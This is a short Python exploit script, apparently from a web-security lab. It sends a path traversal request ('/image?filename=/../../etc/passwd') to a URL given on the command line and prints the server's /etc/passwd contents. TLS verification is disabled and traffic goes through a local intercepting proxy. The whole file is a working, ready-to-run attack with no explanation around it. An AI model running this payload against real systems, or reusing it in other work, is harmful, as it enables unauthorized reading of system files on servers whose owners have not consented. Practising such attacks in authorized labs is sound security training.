import urllib3 
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def path_traversal(s, url):
    file_path = '/image?filename=/../../etc/passwd'
    # headers = {'Content-Type': 'image/png'}
    res = s.get(url+file_path, verify=False, proxies=proxies)
    
    if(res.status_code == 200):
        print("(+) Path Traversal succeeded")
        print(res.text)
    else:
        print("(-) Path Traversal failed")
        print(res.text)
        sys.exit(-1)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" %sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("(+) Exploiting Path Traversal Vulnerability...")
    s = requests.session()
    path_traversal(s, url)

if __name__ == "__main__":
    main()